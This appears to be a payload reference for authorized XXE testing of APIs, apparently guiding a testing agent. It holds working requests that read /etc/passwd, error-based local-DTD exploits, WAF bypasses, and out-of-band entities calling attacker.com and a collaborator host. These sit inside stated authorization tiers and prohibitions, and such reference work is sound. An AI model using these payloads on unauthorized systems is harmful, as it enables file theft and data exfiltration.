# API XML External Entity (XXE) Payload

> ⚠️ **Security Boundary Statement**
>
> This document is for **authorized penetration testing reference** only, helping identify XXE vulnerability risk characteristics in API endpoints.
>
> - All payloads are **technical principle demonstrations**, actual malicious operations are prohibited
> - Payloads are for understanding API attack surface only, **do not enable harm**
> - Validation proves vulnerability existence, **no destructive operations**
> - See `SKILL.md` for specific execution boundaries
>
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadAllTheThings, HackTricks, OWASP API Security

## Manual Testing

**Note: Test API endpoints that accept XML, JSON (with XML content type negotiation), SOAP, GraphQL, and file upload endpoints. Maximum 8 probes per endpoint.**

---

## Validation Tier Classification

This payload file uses a **tiered validation approach**:

| Tier | Description | Authorization |
|------|-------------|---------------|
| **Tier 1: Safe Validation** | Basic entity test, error-based XXE, local file read (test files) | No authorization needed |
| **Tier 2: Authorized Extended** | Cloud metadata access, OOB exfiltration, SSRF to internal services | User explicit authorization required |
| **Tier 3: Theory Reference** | Billion Laugh DoS, sensitive data exfiltration | For understanding only, do not execute |

**Default execution**: Only Tier 1 methods.
**Stop condition**: After confirming XXE exists (entity reflected, error message returned, or file content returned).

---

## Validation Objectives (Within Security Boundary)

API XXE vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| XXE Existence via API | ✓ Basic entity test | - | Billion Laugh DoS |
| File Read via API | ✓ Read test file (`/etc/passwd`, `win.ini`) | - | Read credentials/config |
| SSRF Capability via API | ✓ Probe local service | - | Attack internal services |
| Error-based XXE via API | ✓ Recommended for blind XXE | - | - |
| Cloud Metadata via API | ❌ Not by default | ✓ Requires explicit authorization | Credential exploitation |
| OOB Exfiltration via API | ❌ Not by default | ✓ Requires explicit authorization | Exfiltrate sensitive data |

---

## API-Specific XXE Contexts

### REST API with XML Body

```http
POST /api/users HTTP/1.1
Content-Type: application/xml
Accept: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY example "Doe">]>
<user>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</user>
```

### JSON API with Content-Type Negotiation

Many APIs accept JSON by default but also process XML when `Content-Type: application/xml` is specified:

```http
POST /api/data HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<root>&xxe;</root>
```

> Tip: Always try switching `Content-Type` from `application/json` to `application/xml` at API endpoints.

### SOAP API

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <id><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>]]></id>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

### GraphQL API with XML Input

```http
POST /graphql HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<data>&xxe;</data>
```

### File Upload Endpoint (SVG, DOCX, XLSX)

```http
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=boundary123

--boundary123
Content-Disposition: form-data; name="file"; filename="test.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
--boundary123--
```

---

## Detect Existence

### Basic Entity Test (API)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY test "XXE_CONFIRMED">]>
<request><param>&test;</param></request>
```

Send with `Content-Type: application/xml`. If response contains `XXE_CONFIRMED`, entity processing is enabled.

### JSON-to-XML Content-Type Switch

```bash
# Convert JSON request to XML and change Content-Type
curl -s -X POST "$API_URL" \
  -H "Content-Type: application/xml" \
  -H "Authorization: Bearer $TOKEN" \
  -d '<?xml version="1.0"?><root><param>test</param></root>'
```

## Classic XXE - File Read (API Context)

### Read System File via API

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<apiRequest><data>&xxe;</data></apiRequest>
```

### Base64 Encoded Read (Prevent Special Characters Breaking XML)

```xml
<!DOCTYPE test [
<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">
%init;
]>
<apiRequest/>
```

### XInclude (Cannot Modify DOCTYPE)

```xml
<apiRequest xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</apiRequest>
```

## Blind XXE via API

### Error-Based XXE (Recommended First)

```xml
<!-- Local DTD (Linux) -->
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
<!ENTITY % constant 'aaa)>
      <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
      <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
      &#x25;eval;
      &#x25;error;
      <!ELEMENT aa (bb'>
%local_dtd;
]>
<message>Text</message>
```

> This approach uses local DTD files rather than external network requests, staying within Tier 1 validation.

## ⚠️ OOB XXE via API (Requires Authorization)

**⚠️ IMPORTANT**: OOB exfiltration is NOT a default validation step. It initiates external network requests.

**Default Validation Path**:
1. Try error-based XXE using local DTD (no external network)
2. Confirm XXE capability exists via error message
3. **Stop here** - existence is proven

| Validation Method | Default | Action Required |
|---------|------|------|
| Error-based XXE (local DTD) | ✓ Recommended | No authorization needed |
| OOB exfiltration | ❌ Not default | User must explicitly authorize |

**OOB Authorization Requirements** (all must be met):
1. User explicitly authorizes in writing
2. Target domain: only controlled marker (Collaborator/DNSLog)
3. Data content: only test files, no credentials
4. Report: mark "OOB executed with user authorization"

```xml
<!-- OOB payload - requires user authorization -->
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://YOUR_COLLABORATOR/x">
%ext;
]>
<apiRequest></apiRequest>
```

## API-Specific WAF Bypass

### Content-Type Switching

```bash
# Try multiple content types
Content-Type: application/xml
Content-Type: text/xml
Content-Type: multipart/form-data (with XML file upload)
```

### Character Encoding Bypass

```bash
# UTF-16 encoding
cat payload.xml | iconv -f UTF-8 -t UTF-16BE > utf16_payload.xml
```

### Parameter Entity in API Context

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
%dtd;
]>
<root>&send;</root>
```

## XXE in Common API Frameworks

| Framework | Common XXE Pattern | Notes |
|-----------|-------------------|-------|
| Spring Boot | REST endpoints accepting XML | Disable `isSupportExpandEntityReferences` |
| .NET Core | Web API with XML serialization | `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit` |
| Node.js (express) | `express-xml-bodyparser` | May have entity processing enabled |
| Python (Flask/Django) | XML processing libraries | `lxml`, `xml.etree` vulnerable by default |
| PHP (Laravel) | API routes with XML input | `libxml_disable_entity_loader(true)` recommended |
| Java (JAX-RS) | SOAP/XML endpoints | Default parsers may process entities |

## Analysis Process

1. Identify API endpoints accepting XML input (Content-Type, file upload, SOAP)
2. Test Content-Type switching from JSON to XML
3. Basic entity test to confirm XML entity processing
4. Try reading system test file (`/etc/passwd`, `/etc/hostname`)
5. No echo -> Try error-based XXE first (local DTD)
6. If OOB needed -> Must obtain user additional authorization first
7. Check file upload endpoints for SVG/DOCX/XLSX XXE
8. Confirm vulnerability existence, stop further exploitation

## Output

- Proof payload (complete HTTP request with headers)
- API endpoint and method
- Content-Type used
- Read test file content or error message
- If using OOB: mark "with user authorization"

## Severity Classification

API XXE severity is based on what the parser can read after entity expansion (same model as xxe.md).

| Actual case | Severity | Note |
|---------|------|------|
| reads sensitive file (configuration contains keys)or OOB exfiltration succeeded (user authorization) | High | data disclosure |
| Reads /etc/passwd etc. proves file-read capability | High | capability confirmed (same path-traversal caliber)|
| only reads a test file (no sensitive information) | Medium | capability confirmed, content is harmless |
| Proof only: entity parsing is enabled (entity is replaced/error echo) | Low | Parsing capability only |
| entity parsing disabled (DOCTYPE is filtered) | Low | defense effective |

**Key judgment**: Reporting High requires confirming sensitive file content is actually echoed / exfiltration succeeded. Entity replacement or test-file read only records Low/Medium. OOB exfiltration requires user authorization.

---

## Prohibited

- ⚠️ No DoS attacks (Billion Laugh etc.)
- ⚠️ No reading sensitive files (private keys, credentials, config)
- ⚠️ No XXE-SSRF attack on internal services
- ⚠️ No OOB exfiltration without authorization
- ⚠️ Only prove existence, do not enable harm